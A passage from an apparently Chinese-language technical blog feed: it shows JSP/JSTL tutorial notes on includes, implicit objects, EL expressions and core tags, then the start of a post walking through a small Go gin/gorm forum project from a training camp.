<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error/404.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/error/500.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>头部和尾部页面拼接</p>
</blockquote>
<ul>
<li>footer.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;footer&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我是footer&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>header.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;head&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;我是header&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>jsp3.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;jsp3&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;%-- <span class="meta">@include</span>会将两个页面合二为一 --%&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%<span class="meta">@include</span> file=<span class="string">&quot;common/header.jsp&quot;</span>%&gt;</span><br><span class="line">    &lt;h1&gt;网页主体&lt;/h1&gt;</span><br><span class="line">    &lt;%<span class="meta">@include</span> file=<span class="string">&quot;common/footer.jsp&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">    &lt;hr&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%--</span><br><span class="line">        jsp标签</span><br><span class="line">        jsp:include：拼接页面，本质还是三个</span><br><span class="line">    --%&gt;</span><br><span class="line">    &lt;jsp:include page=<span class="string">&quot;/common/header.jsp&quot;</span>/&gt;</span><br><span class="line">    &lt;h1&gt;网页主体&lt;/h1&gt;</span><br><span class="line">    &lt;jsp:include page=<span class="string">&quot;/common/footer.jsp&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h3 id="5-9大内置对象"><a href="#5-9大内置对象" class="headerlink" title="5.9大内置对象"></a>5.9大内置对象</h3><ul>
<li>PageContext    存东西</li>
<li>Request     存东西</li>
<li>Response</li>
<li>Session      存东西</li>
<li>Application   【SerlvetContext】   存东西</li>
<li>config    【SerlvetConfig】</li>
<li>out</li>
<li>page ，不用了解</li>
<li>exception</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%--内置对象--%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;天启1号&quot;</span>); <span class="comment">// 保存的数据只在一个页面中有效</span></span><br><span class="line">    request.setAttribute(<span class="string">&quot;name2&quot;</span>,<span class="string">&quot;天启2号&quot;</span>); <span class="comment">// 保存的数据只在一次请求中有效，请求转发会携带这个数据</span></span><br><span class="line">    session.setAttribute(<span class="string">&quot;name3&quot;</span>,<span class="string">&quot;天启3号&quot;</span>); <span class="comment">// 保存的数据只在一次会话中有效，从打开浏览器到关闭浏览器</span></span><br><span class="line">    application.setAttribute(<span class="string">&quot;name4&quot;</span>,<span class="string">&quot;天启4号&quot;</span>);  <span class="comment">// 保存的数据只在服务器中有效，从打开服务器到关闭服务器</span></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--</span><br><span class="line">    脚本片段中的代码，会被原封不动生成到.jsp.java</span><br><span class="line">    要求：这里面的代码，必须保证Java语法的正确性</span><br><span class="line">--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 从pageContent取出，我们通过寻找的方式来</span></span><br><span class="line">    <span class="comment">// 从底层到高层（作用域）:</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name1</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name1&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name2</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name2&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name3</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name3&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name4</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name4&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name5</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name5&quot;</span>); <span class="comment">// 作用域</span></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--使用EL表达式输出 $&#123;&#125; --%&gt;</span><br><span class="line">&lt;h1&gt;取出的值:&lt;/h1&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name1&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name2&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name3&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name4&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt; &lt;%=name5%&gt; &lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果EL表达式不生效，请在JSP页面最上面加上：&lt;%@page isELIgnored&#x3D;”false” %&gt;</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/21638d6fda0959ab9123bd789f459dea--1446--image-20241020183424440.png" alt="image-20241020183424440"></p>
<ul>
<li>request：客户端向服务器发送请求，产生的数据，用户看完就没用了，比如：新闻，用户看完没用的！</li>
<li>session：客户端向服务器发送请求，产生的数据，用户用完一会还有用，比如：购物车；</li>
<li>application：客户端向服务器发送请求，产生的数据，一个用户用完了，其他用户还可能使用，比如：聊天数据；</li>
</ul>
<h3 id="6-JSP标签-JSTL标签-EL表达式"><a href="#6-JSP标签-JSTL标签-EL表达式" class="headerlink" title="6.JSP标签.JSTL标签.EL表达式"></a>6.JSP标签.JSTL标签.EL表达式</h3><ul>
<li>EL表达式：  ${ }<ul>
<li><strong>获取数据</strong></li>
<li><strong>执行运算</strong></li>
<li><strong>获取web开发的常用对象</strong></li>
</ul>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!-- JSTL表达式的依赖 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet.jsp.jstl&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jstl-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- standard标签库 --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;taglibs&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;standard&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.1</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>JSP标签</strong></p>
</li>
<li><p>jspTag.jsp</p>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;jspTag&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Tag1&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--jsp:include--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--</span><br><span class="line">http:<span class="comment">//localhost:8080/Jsp/jspTag.jsp?name=subeily&amp;age=18</span></span><br><span class="line">--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;/jspTag2.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;subeiLY&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;age&quot;</span> value=<span class="string">&quot;18&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>jspTag2.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;jspTag2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Tag2&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--取出参数--%&gt;</span><br><span class="line">    </span><br><span class="line">名字:&lt;%=request.getParameter(<span class="string">&quot;name&quot;</span>)%&gt;</span><br><span class="line">年龄:&lt;%=request.getParameter(<span class="string">&quot;age&quot;</span>)%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://www.runoob.com/jsp/jsp-jstl.html"><strong>JSTL表达式</strong></a><ul>
<li>JSTL标签库的使用就是为了弥补HTML标签的不足；它自定义许多标签，可以供我们使用，标签的功能和Java代码一样！</li>
</ul>
</li>
<li><strong>格式化标签</strong></li>
<li><strong>SQL标签</strong></li>
<li><strong>XML 标签</strong></li>
<li><strong>核心标签</strong> （掌握部分）</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/6735274c191f54e070ccc111214cafa4--9647--image-20241020184405012.png" alt="image-20241020184405012"></p>
<ul>
<li><p><strong>JSTL标签库使用步骤</strong>：</p>
<ul>
<li>引入对应的 taglib；</li>
<li>使用其中的方法；</li>
<li><strong>在Tomcat 的lib目录下也需要引入 jstl-api-1.2.jar、standard-1.1.2.jar的包，否则会报错：JSTL解析错误</strong>；</li>
</ul>
</li>
<li><p>c：if</p>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%--引入jstl核心标签库--%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;core-<span class="keyword">if</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h4&gt;<span class="keyword">if</span>测试&lt;/h4&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;core-if.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;%--</span><br><span class="line">        EL表达式获取表单中的数据</span><br><span class="line">        $&#123;param.参数名&#125;</span><br><span class="line">    --%&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;$&#123;param.username&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--判断如果提交的用户名是管理员，则登录成功--%&gt;</span><br><span class="line">&lt;c:<span class="keyword">if</span> test=<span class="string">&quot;$&#123;param.username==&#x27;admin&#x27;&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;isAdmin&quot;</span>&gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;管理员欢迎您！&quot;</span>/&gt;</span><br><span class="line">&lt;/c:<span class="keyword">if</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--自闭合标签--%&gt;</span><br><span class="line">&lt;c:out value=<span class="string">&quot;$&#123;isAdmin&#125;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>c:choose   c:when</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%--引入jstl核心标签库--%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;core-<span class="keyword">for</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--定义一个变量score，值为<span class="number">85</span>--%&gt;</span><br><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">&quot;score&quot;</span> value=<span class="string">&quot;65&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:choose&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;score&gt;=90&#125;&quot;</span>&gt;</span><br><span class="line">        你的成绩为优秀</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;score&gt;=80&#125;&quot;</span>&gt;</span><br><span class="line">        你的成绩为一般</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;score&gt;=70&#125;&quot;</span>&gt;</span><br><span class="line">        你的成绩为良好</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;score&lt;=60&#125;&quot;</span>&gt;</span><br><span class="line">        你的成绩为不及格</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">&lt;/c:choose&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>c:forEach</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%--引入jstl核心标签库--%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;core-foreach&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    ArrayList&lt;String&gt; people = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    people.add(<span class="number">0</span>,<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">    people.add(<span class="number">1</span>,<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">    people.add(<span class="number">2</span>,<span class="string">&quot;王五&quot;</span>);</span><br><span class="line">    people.add(<span class="number">3</span>,<span class="string">&quot;赵六&quot;</span>);</span><br><span class="line">    people.add(<span class="number">4</span>,<span class="string">&quot;田六&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;list&quot;</span>,people);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--</span><br><span class="line"><span class="keyword">var</span> , 每一次遍历出来的变量</span><br><span class="line">items, 要遍历的对象</span><br><span class="line">begin,   哪里开始</span><br><span class="line">end,     到哪里</span><br><span class="line">step,   步长</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;people&quot;</span> items=<span class="string">&quot;$&#123;list&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;$&#123;people&#125;&quot;</span>/&gt; &lt;br&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;people&quot;</span> items=<span class="string">&quot;$&#123;list&#125;&quot;</span> begin=<span class="string">&quot;1&quot;</span> end=<span class="string">&quot;3&quot;</span> step=<span class="string">&quot;1&quot;</span> &gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;$&#123;people&#125;&quot;</span>/&gt; &lt;br&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="六、JavaBean"><a href="#六、JavaBean" class="headerlink" title="六、JavaBean"></a>六、JavaBean</h2>]]></content>
  </entry>
  <entry>
    <title>字节训练营学习记录</title>
    <url>/2024/11/08/%E5%AD%97%E8%8A%82%E8%AE%AD%E7%BB%83%E8%90%A5%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>本篇文章主要记录在青训营X豆包MarsCode 技术训练营后端go语言学习的一些经历与过程。</p>
<span id="more"></span>

<h1 id="一、青训营X豆包MarsCode-技术训练营之简易发帖项目记录"><a href="#一、青训营X豆包MarsCode-技术训练营之简易发帖项目记录" class="headerlink" title="一、青训营X豆包MarsCode 技术训练营之简易发帖项目记录"></a>一、青训营X豆包MarsCode 技术训练营之简易发帖项目记录</h1><p>​	首先就是这次文章是怎么来的，是因为在训练营中看到了第四课，讲的是Go语言工程实践以及对应使用的gin框架，但是发现项目全套代码是有了，但是却没有分段的对应代码，应该是后边课程讲的但是没在此次训练营的课程表中吗，所以在此也是根据自己的理解对该项目进行一定的记录学习。并且，由于是直接对于一个项目进行分析的，就不过多对于理论部分进行讲解了。</p>
<h2 id="1、Gin框架。"><a href="#1、Gin框架。" class="headerlink" title="1、Gin框架。"></a>1、Gin框架。</h2><p>​	gin框架也是go中的一个最常见的框架了，能够让我们快速的启动一些http服务，非常的方便快捷。这里也就不多介绍了，本篇文章的侧重点是项目分析，这个也不是很难，可以直接看官方文档即可。<a href="https://gin-gonic.com/zh-cn/docs/quickstart/">https://gin-gonic.com/zh-cn/docs/quickstart/</a></p>
<h2 id="2、项目结构"><a href="#2、项目结构" class="headerlink" title="2、项目结构"></a>2、项目结构</h2><p>首先就是我们可以去分析一下项目的结果，这里我将给的项目中的一些测试以及知识点代码都去掉了，剩下了这些代码，并且其中service是用来测试项目功能的</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241110123533028.png" alt="image-20241110123533028"></p>
<p>接下来我们就是对这些代码进行理解。</p>
<p>首先就是启动项，server.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gopkg.in/gin-gonic/gin.v1&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="comment">//&quot;github.com/Moonlight-Zhao/go-project-example/handler&quot;</span></span><br><span class="line">	<span class="comment">//&quot;github.com/Moonlight-Zhao/go-project-example/repository&quot;</span></span><br><span class="line">	<span class="string">&quot;test01/server/handler&quot;</span></span><br><span class="line">	<span class="string">&quot;test01/server/repository&quot;</span></span><br><span class="line">	<span class="string">&quot;test01/server/util&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := Init(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		os.Exit(<span class="number">-1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	r := gin.Default()</span><br><span class="line"></span><br><span class="line">	r.Use(gin.Logger())</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/ping&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/community/page/get/:id&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		topicId := c.Param(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		data := handler.QueryPageInfo(topicId)</span><br><span class="line">		c.JSON(<span class="number">200</span>, data)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/community/post/do&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		uid, _ := c.GetPostForm(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line">		topicId, _ := c.GetPostForm(<span class="string">&quot;topic_id&quot;</span>)</span><br><span class="line">		content, _ := c.GetPostForm(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">		data := handler.PublishPost(uid, topicId, content)</span><br><span class="line">		c.JSON(<span class="number">200</span>, data)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	err := r.Run(<span class="string">&quot;:8081&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := repository.Init(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := util.InitLogger(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们就是可以发现这是一个很简单的启动服务</p>
<p>定义了三个路由，分别是一个测试路由，一个获取页面，一个添加页面的路由，没有什么很难理解的，Init则是初始化各组件，并且如果初始化失败则会返回err</p>
<p>接下来我们去看看util，发现里面只有一个文件，看名字就很浅显易懂</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;go.uber.org/zap&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Logger *zap.Logger</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitLogger</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	Logger, err = zap.NewProduction()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个日志记录器方便使用，以方便调试</p>
<p>然后就是看repository，这个名字也很明显，仓库对吧，这也就是和数据库打交道的地方，专门用于操作数据库的，这里我们可以首先看数据库的初始化</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> repository</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	dsn := <span class="string">&quot;root:root@tcp(127.0.0.1:3306)/community?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">	db, err = gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很简单的一个Init函数，用于初始化数据库</p>
<p>接下来就是对应的三个文件分别对应数据库中的三个表</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241110130119241.png" alt="image-20241110130119241"></p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241110130127895.png" alt="image-20241110130127895"></p>
<p>很容易看懂的结构也是，我们就对此，分析一个post文件吧</p>
